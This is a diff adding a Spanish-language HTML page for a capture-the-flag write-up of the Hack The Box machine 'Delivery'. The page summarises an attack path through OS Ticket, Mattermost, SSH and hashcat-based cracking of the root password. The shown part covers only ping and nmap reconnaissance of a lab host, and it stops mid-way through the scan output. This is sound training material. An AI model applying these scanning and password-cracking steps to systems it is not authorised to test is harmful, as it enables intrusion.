@@ -1,0 +1,1233 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Delivery - Hack The Box · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/htb-writeup-delivery/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="Delivery - Hack The Box">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/htb-writeup-delivery/delivery_logo.png">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/WiFi-Notes2/">
+          <span class="side-post-card-title">Hacking WiFi</span>
+          <span class="side-post-card-platform">Análisis de Entorno</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-scriptkiddie/">
+          <span class="side-post-card-title">ScriptKiddie</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">Delivery</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-active/">
+          <span class="side-post-card-title">Active</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-bounty/">
+          <span class="side-post-card-title">Bounty</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">HackTheBox / Easy Machine</div>
+    
+    <h1>Delivery - Hack The Box</h1>
+    <div class="post-meta">5 May 2023 · 15 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/htb-writeup-delivery/delivery_logo.png" alt="Delivery - Hack The Box">
+  
+
+  
+  <p class="post-lead">Esta fue una máquina bastante interesante, lo que hicimos fue analizar el servicio HTTP para descubrir que tienen un sistema de tickets y un servidor, a su vez usan Virtual Hosting por lo que registramos los dominios y aprovechamos un ticket creado que nos crea un correo temporal en OS Ticket (su sistema de tickets), con esto usaremos el servicio Mattermost para crear una cuenta con el fin de entrar a este servicio. Una vez dentro de Mattermost, vemos mensajes del Root, que nos indican el usuario y contraseña del servicio SSH, además nos dan una pista siendo que debemos ir a la base de datos de Mattermost dentro del servicio SSH para obtener el hash del Root, con esto podremos usar las reglas de hashcat para poder crear un diccionario y poder crackear el hash para autenticarnos como Root.</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>wappalizer</code></li><li><code>whatweb</code></li><li><code>nano</code></li><li><code>ssh</code></li><li><code>grep</code></li><li><code>mysql</code></li><li><code>hashid</code></li><li><code>hashcat</code></li><li><code>johntheripper</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#Ticket">Probando Servicio OS Ticket y Ganando Acceso a Servicio Mattermost</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#Matter">Analizando Servicio Mattermost</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#Matter2">Buscando Hashes del Servicio Mattermost</a>
+          <ul>
+            <li><a href="#Mysql">Enumeración de Base de Datos MySQL</a></li>
+          </ul>
+        </li>
+        <li><a href="#Hash">Creando Diccionario con Reglas de Hashcat y Crackeando Hash de Contraseña del Usuario Root</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#Ticket">Probando Servicio OS Ticket y Ganando Acceso a Servicio Mattermost</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#Matter">Analizando Servicio Mattermost</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#Matter2">Buscando Hashes del Servicio Mattermost</a>
+          <ul>
+            <li><a href="#Mysql">Enumeración de Base de Datos MySQL</a></li>
+          </ul>
+        </li>
+        <li><a href="#Hash">Creando Diccionario con Reglas de Hashcat y Crackeando Hash de Contraseña del Usuario Root</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 10.10.10.222
+</span></span><span style="display:flex;"><span>PING 10.10.10.222 <span style="color:#f92672">(</span>10.10.10.222<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.222: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">131</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.222: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">131</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.222: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">132</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.222: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">63</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">132</span> ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 10.10.10.222 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3008ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 130.588/131.581/132.319/0.666 ms
+</span></span></code></pre></div><p>Por el TTL sabemos que la máquina usa Linux, hagamos los escaneos de puertos y servicios.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 10.10.10.222 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-05-05 12:22 CST
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 12:22
+</span></span><span style="display:flex;"><span>Scanning 10.10.10.222 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.10.10.222
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 10.10.10.222
+</span></span><span style="display:flex;"><span>Discovered open port 8065/tcp on 10.10.10.222
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 12:23, 35.87s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.222
+</span></span><span style="display:flex;"><span>Host is up, received user-set <span style="color:#f92672">(</span>0.41s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2023-05-05 12:22:53 CST <span style="color:#66d9ef">for</span> 35s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">39964</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>, <span style="color:#ae81ff">25568</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE REASON
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span>
+</span></span><span style="display:flex;"><span>80/tcp   open  http    syn-ack ttl <span style="color:#ae81ff">63</span>
+</span></span><span style="display:flex;"><span>8065/tcp open  unknown syn-ack ttl <span style="color:#ae81ff">63</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 35.97 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">172589</span> <span style="color:#f92672">(</span>7.594MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">26071</span> <span style="color:#f92672">(</span>1.077MB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Hay 3 puertos abiertos, pero se me hace que todo se va a basar en el puerto HTTP, hagamos un escaneo de servicios.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sC -sV -p22,80,8065 10.10.10.222 -oN targeted                      
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-05-05 12:25 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.222
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 9c40fa859b01acac0ebc0c19518aee27 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 5a0cc03b9b76552e6ec4f4b95d761709 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> b79df7489da2f27630fd42d3353a808c <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp   open  http    nginx 1.14.2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.14.2
+</span></span><span style="display:flex;"><span>|_http-title: Welcome
+</span></span><span style="display:flex;"><span>8065/tcp open  unknown
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">400</span> Bad Request
+</span></span><span style="display:flex;"><span>|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     Request
+</span></span><span style="display:flex;"><span>|   GetRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>|     Accept-Ranges: bytes
+</span></span><span style="display:flex;"><span>|     Cache-Control: no-cache, max-age<span style="color:#f92672">=</span>31556926, public
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">3108</span>
+</span></span><span style="display:flex;"><span>|     Content-Security-Policy: frame-ancestors <span style="color:#e6db74">&#39;self&#39;</span>; script-src <span style="color:#e6db74">&#39;self&#39;</span> cdn.rudderlabs.com
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>|     Last-Modified: Fri, <span style="color:#ae81ff">05</span> May <span style="color:#ae81ff">2023</span> 18:17:51 GMT
+</span></span><span style="display:flex;"><span>|     X-Frame-Options: SAMEORIGIN
+</span></span><span style="display:flex;"><span>|     X-Request-Id: ngd3jjncpiyr8gg7rxozrixk1w
+</span></span><span style="display:flex;"><span>|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
+</span></span><span style="display:flex;"><span>|     Date: Fri, <span style="color:#ae81ff">05</span> May <span style="color:#ae81ff">2023</span> 18:25:24 GMT
+</span></span><span style="display:flex;"><span>|     &lt;!doctype html&gt;&lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;&lt;head&gt;&lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;&lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0&#34;</span>&gt;&lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;robots&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;noindex, nofollow&#34;</span>&gt;&lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;referrer&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;no-referrer&#34;</span>&gt;&lt;title&gt;Mattermost&lt;/title&gt;&lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mobile-web-app-capable&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;yes&#34;</span>&gt;&lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;application-name&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Mattermost&#34;</span>&gt;&lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;format-detection&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;telephone=no&#34;</span>&gt;&lt;link re
+</span></span><span style="display:flex;"><span>|   HTTPOptions: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">405</span> Method Not Allowed
+</span></span><span style="display:flex;"><span>|     Date: Fri, <span style="color:#ae81ff">05</span> May <span style="color:#ae81ff">2023</span> 18:25:24 GMT
+</span></span><span style="display:flex;"><span>|_    Content-Length: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port8065-TCP:V<span style="color:#f92672">=</span>7.93%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>5/5%Time<span style="color:#f92672">=</span>64554A11%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>Gen
+</span></span><span style="display:flex;"><span>SF:ericLines,67,<span style="color:#e6db74">&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0Request&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GetRequest,DF3,<span style="color:#e6db74">&#34;HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20bytes\r\nCache-Control:\x20no-cache,\x20max-age=31556926,\x20public\r
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\nContent-Length:\x203108\r\nContent-Security-Policy:\x20frame-ancestor
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:s\x20&#39;self&#39;;\x20script-src\x20&#39;self&#39;\x20cdn\.rudderlabs\.com\r\nContent
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:-Type:\x20text/html;\x20charset=utf-8\r\nLast-Modified:\x20Fri,\x2005\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20May\x202023\x2018:17:51\x20GMT\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:-Request-Id:\x20ngd3jjncpiyr8gg7rxozrixk1w\r\nX-Version-Id:\x205\.30\.0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\.5\.30\.1\.57fb31b889bf81d99d8af8176d4bbaaa\.false\r\nDate:\x20Fri,\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:005\x20May\x202023\x2018:25:24\x20GMT\r\n\r\n&lt;!doctype\x20html&gt;&lt;html\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0lang=\&#34;en\&#34;&gt;&lt;head&gt;&lt;meta\x20charset=\&#34;utf-8\&#34;&gt;&lt;meta\x20name=\&#34;viewport\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&#34;</span><span style="color:#ae81ff">\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>width<span style="color:#f92672">=</span>device-width,initial-scale<span style="color:#f92672">=</span>1,maximum-scale<span style="color:#f92672">=</span>1,user-
+</span></span><span style="display:flex;"><span>SF:scalable<span style="color:#f92672">=</span>0<span style="color:#ae81ff">\&#34;</span>&gt;&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>robots<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>noindex,<span style="color:#ae81ff">\x</span>20nofollow
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\&#34;</span>&gt;&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>referrer<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>no-referrer<span style="color:#ae81ff">\&#34;</span>&gt;&lt;title&gt;Matterm
+</span></span><span style="display:flex;"><span>SF:ost&lt;/title&gt;&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>mobile-web-app-capable<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>yes<span style="color:#ae81ff">\&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>SF:&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>application-name<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>Mattermost<span style="color:#ae81ff">\&#34;</span>&gt;&lt;meta<span style="color:#ae81ff">\x</span>20n
+</span></span><span style="display:flex;"><span>SF:ame<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>format-detection<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>telephone<span style="color:#f92672">=</span>no<span style="color:#ae81ff">\&#34;</span>&gt;&lt;link<span style="color:#ae81ff">\x</span>20re<span style="color:#e6db74">&#34;)%r(HT
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:TPOptions,5B,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\x</span>20405<span style="color:#ae81ff">\x</span>20Method<span style="color:#ae81ff">\x</span>20Not<span style="color:#ae81ff">\x</span>20Allowed<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>SF:Fri,<span style="color:#ae81ff">\x</span>2005<span style="color:#ae81ff">\x</span>20May<span style="color:#ae81ff">\x</span>202023<span style="color:#ae81ff">\x</span>2018:25:24<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Content-Length:<span style="color:#ae81ff">\x</span>200<span style="color:#ae81ff">\r\
+</span></span></span><span style="display:flex;"><span>SF:n<span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;)%r(RTSPRequest,67,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#ae81ff">\r\n</span>Content
+</span></span><span style="display:flex;"><span>SF:-Type:<span style="color:#ae81ff">\x</span>20text/plain;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span><span style="color:#ae81ff">4</span>
